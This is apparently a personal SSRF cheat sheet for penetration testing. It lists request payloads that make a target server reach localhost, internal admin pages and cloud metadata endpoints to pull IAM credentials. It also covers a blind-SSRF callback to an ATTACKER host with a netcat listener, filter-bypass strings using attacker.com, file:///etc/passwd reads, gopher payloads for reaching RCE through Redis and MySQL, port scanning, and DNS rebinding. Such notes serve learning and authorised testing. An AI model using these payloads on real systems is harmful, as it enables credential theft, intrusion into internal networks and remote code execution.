SSRF is when an attacker tricks a server into making requests for them—usually to internal stuff they can’t reach directly, like internal APIs or cloud metadata. That’s the gist.

Two types:

Regular SSRF → server response is returned to us  
Blind SSRF → request happens, but response is not shown

Break / Test

External URL:

```
http://TARGET/?url=http://example.com
```

Localhost:

```
http://TARGET/?url=http://127.0.0.1
http://TARGET/?url=http://localhost
```

Internal admin page:

```
http://TARGET/?url=http://127.0.0.1/admin
```

AWS metadata:

```
http://TARGET/?url=http://169.254.169.254/latest/meta-data/
```

Using curl:

```
curl "http://TARGET/?url=http://127.0.0.1"
```

Blind SSRF callback:

```
http://TARGET/?url=http://ATTACKER:PORT
```

Listener:

```
nc -nlvp PORT
```

## Advanced 

**1. Cloud Metadata (The Crown Jewels)**

AWS is just the start. Every cloud provider has a metadata endpoint. If you hit it, you get IAM credentials.

- **AWS (IMDSv2):** Requires a token first. `PUT /latest/api/token` with header `X-aws-ec2-metadata-token-ttl-seconds: 21600`. Then use that token in a GET.
- **GCP:** `http://metadata.google.internal/computeMetadata/v1/` → Requires header `Metadata-Flavor: Google`.
- **Azure:** `http://169.254.169.254/metadata/instance?api-version=2021-02-01` → Requires header `Metadata: true`.
- **DigitalOcean:** `http://169.254.169.254/metadata/v1/`

**2. Bypassing Filters / Blacklists**

If `127.0.0.1` is blocked, the app is lazy. Try these:

```
127.1
0.0.0.0
[::1]
0177.0.0.1
2130706433 (decimal)
0x7f000001 (hex)
http://127.0.0.1@attacker.com
http://attacker.com#@127.0.0.1
```

**3. Protocol Smuggling (Gopher, Dict, File)**

Don't just HTTP. SSRF is an open door to internal protocols.

- **File:** `file:///etc/passwd` (read local files).
- **Gopher:** `gopher://127.0.0.1:6379/_...` (interact with Redis, MySQL, FastCGI). This is how you turn SSRF into RCE.
- **Dict:** `dict://127.0.0.1:11211/stat` (interact with Memcached).

**4. Blind SSRF (Port Scanning & RCE)**

You don't see the response, so you measure behavior.

- **Internal Port Scan:** `http://TARGET/?url=http://127.0.0.1:22` vs `:80` vs `:3306`. Look for time delays or differences in response length.
- **Burp Collaborator / interactsh:** Replace `nc` with these. They catch DNS and HTTP interactions, even if the server doesn't return the response.

**5. DNS Rebinding**

If the app resolves the domain, checks the IP, then makes the request, you can use a domain that resolves to `127.0.0.1` only on the second lookup. Tools like `rebind.network` do this for you.

**Tools to remember:**

- **SSRFmap** — automated SSRF exploitation.
- **Gopherus** — generates gopher payloads for Redis, MySQL, FastCGI.
- **Burp Collaborator** — catches blind SSRF out-of-band.

**Key takeaway:** SSRF isn't just "read the internal page." It's "make the server do things you can't." Cloud metadata, internal protocols, and blind port scanning are where the real impact lives.
